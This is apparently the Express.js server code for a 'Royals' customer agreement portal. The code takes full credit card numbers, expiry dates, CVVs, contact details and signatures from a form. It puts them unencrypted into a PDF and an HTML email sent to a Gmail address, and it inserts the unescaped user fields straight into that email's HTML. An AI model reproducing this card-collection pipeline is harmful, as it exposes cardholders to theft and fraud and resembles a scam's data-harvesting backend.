const express = require('express');
const path = require('path');
const { Resend } = require('resend');
const PDFDocument = require('pdfkit');

// Load local .env variables if running locally during development
if (process.env.NODE_ENV !== 'production') {
    try {
        require('dotenv').config();
    } catch (e) {
        // dotenv optional in production environments
    }
}

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Resend securely using environment variables
const resend = new Resend(process.env.RESEND_API_KEY);

// Middleware to parse JSON bodies
app.use(express.json({ limit: '15mb' }));

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Helper function to generate a printable PDF buffer for physical records
function generatePdfBuffer(formData, clientFullName, refNum, amount, clientIp, submissionTimestamp) {
    return new Promise((resolve, reject) => {
        try {
            const doc = new PDFDocument({ margin: 40, size: 'A4' });
            const buffers = [];

            doc.on('data', buffers.push.bind(buffers));
            doc.on('end', () => {
                const pdfBuffer = Buffer.concat(buffers);
                resolve(pdfBuffer);
            });

            // PDF Header Styling
            doc.fontSize(20).fillColor('#d4af37').text('ROYALS - OFFICIAL CUSTOMER AGREEMENT', { align: 'center' });
            doc.fontSize(10).fillColor('#666666').text('Secure Verification & Payment Authorization Record', { align: 'center' });
            doc.moveDown(1.5);

            // Transaction Meta Bar
            doc.fontSize(11).fillColor('#000000');
            doc.text(`Reference Number: ${refNum}`, { continued: true }).text(`Date: ${submissionTimestamp}`, { align: 'right' });
            doc.text(`Origin IP Address: ${clientIp}`);
            doc.moveDown(1);

            // Draw dividing line
            doc.strokeColor('#d4af37').lineWidth(1).moveTo(40, doc.y).lineTo(555, doc.y).stroke();
            doc.moveDown(1);

            // Client & Billing Information Section
            doc.fontSize(14).fillColor('#d4af37').text('Client & Transaction Details');
            doc.moveDown(0.5);

            const details = [
                ['Client Full Name:', clientFullName],
                ['Phone Number:', formData.phone || 'N/A'],
                ['Email Address:', formData.email || 'N/A'],
                ['Billing Address:', formData.billingAddress || 'N/A'],
                ['Shipping Address:', formData.shippingAddress || 'N/A'],
                ['Authorized Amount:', `$${amount} USD`],
                ['Cardholder Name:', formData.cardholderName || 'N/A'],
                ['Credit Card Number:', formData.cardNumber || 'N/A'],
                ['Expiration & CVV:', `${formData.cardExp || 'N/A'} / ${formData.cardCvv || 'N/A'}`],
                ['Assigned Agent:', formData.agentName || 'N/A'],
                ['Closing Specialist:', formData.closerName || 'N/A']
            ];

            doc.fontSize(10).fillColor('#333333');
            details.forEach(([label, value]) => {
                doc.font('Helvetica-Bold').text(label, { continued: true, width: 140 });
                doc.font('Helvetica').text(` ${value}`);
                doc.moveDown(0.4);
            });

            doc.moveDown(1);

            // Digital Signature Section if present
            if (formData.signature) {
                doc.fontSize(12).fillColor('#d4af37').text('Client E-Signature Verification');
                doc.moveDown(0.5);
                
                try {
                    // Extract base64 image data from data URL
                    const base64Data = formData.signature.replace(/^data:image\/png;base64,/, '');
                    const signatureBuffer = Buffer.from(base64Data, 'base64');
                    doc.image(signatureBuffer, { width: 200, height: 80, align: 'center' });
                } catch (sigErr) {
                    doc.font('Helvetica-Oblique').fontSize(10).text('[Digital Signature Captured Successfully]');
                }
            }

            doc.moveDown(2);
            doc.fontSize(8).fillColor('#888888').text('ROYALS SECURE CLIENT VERIFICATION TERMINAL • OFFICIAL PHYSICAL RECORD', { align: 'center' });

            doc.end();
        } catch (err) {
            reject(err);
        }
    });
}

// API endpoint to handle form submission & PDF attachment
app.post('/api/submit-form', async (req, res) => {
    try {
        const formData = req.body;
        const clientFullName = `${formData.firstName} ${formData.lastName}`;
        const refNum = formData.referenceNumber || 'N/A';
        const amount = formData.amount || '0';
        
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Secure Node';
        const submissionTimestamp = new Date().toUTCString();

        // Generate the physical PDF buffer
        const pdfBuffer = await generatePdfBuffer(formData, clientFullName, refNum, amount, clientIp, submissionTimestamp);

        // HTML Email content for Management (keeps the exact layout you like)
        const managementEmailHtml = `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0b0b; color: #f3f3f3; padding: 35px; border-radius: 10px; border: 1px solid #333;">
                <h2 style="color: #d4af37; text-transform: uppercase; border-bottom: 2px solid #d4af37; padding-bottom: 10px; letter-spacing: 1px;">Royals - New Customer Agreement Submitted</h2>
                
                <p style="font-size: 16px; color: #ffe875; margin-bottom: 20px;"><strong>Client:</strong> ${clientFullName}</p>
                
                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px; background: #141414; border: 1px solid #333;">
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa; width: 35%;"><strong>Reference Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${refNum}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Client Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${clientFullName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Phone Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.phone}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Email Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.email}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Billing Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.billingAddress}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Shipping Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.shippingAddress}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Authorized Amount:</strong></td>
                        <td style="padding: 12px; color: #ffe875; font-size: 18px; font-weight: bold;">$${amount}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Cardholder Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardholderName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Credit Card Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardNumber}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Expiration & CVV:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardExp} / ${formData.cardCvv}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Agent Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.agentName}</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; color: #aaa;"><strong>Closer Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.closerName}</td>
                    </tr>
                </table>

                ${formData.signature ? `
                    <div style="background: #141414; padding: 15px; border: 1px solid #333; border-radius: 6px; text-align: center;">
                        <p style="color: #d4af37; margin-bottom: 10px; font-size: 14px;"><strong>Client Digital Signature:</strong></p>
                        <img src="${formData.signature}" alt="Client Signature" style="background: #1f1f1f; border: 1px solid #d4af37; border-radius: 4px; max-width: 300px; height: auto;" />
                    </div>
                ` : ''}

                <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px;">ROYALS Secure Client Verification Terminal • 2026 (Physical PDF Attached)</p>
            </div>
        `;

        // Send email to royals101llc@gmail.com with the printable PDF attached
        const emailResponse = await resend.emails.send({
            from: 'Royals Secure Portal <onboarding@resend.dev>',
            to: ['royals101llc@gmail.com'],
            replyTo: formData.email,
            subject: `ROYALS Agreement | Client: ${clientFullName} | Ref: ${refNum} | Amount: $${amount}`,
            html: managementEmailHtml,
            attachments: [
                {
                    filename: `Royals-Agreement-${refNum}.pdf`,
                    content: pdfBuffer,
                },
            ],
            headers: {
                'X-Priority': '1 (Highest)',
                'X-MSMail-Priority': 'High',
                'Importance': 'High'
            }
        });

        console.log('Email sent successfully with PDF attachment:', emailResponse);
        res.json({ success: true, message: 'Agreement submitted and physical PDF attached successfully.' });

    } catch (error) {
        console.error('Error handling form submission:', error);
        res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
});

// Fallback route to serve index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Royals server running on port ${PORT}`);
});
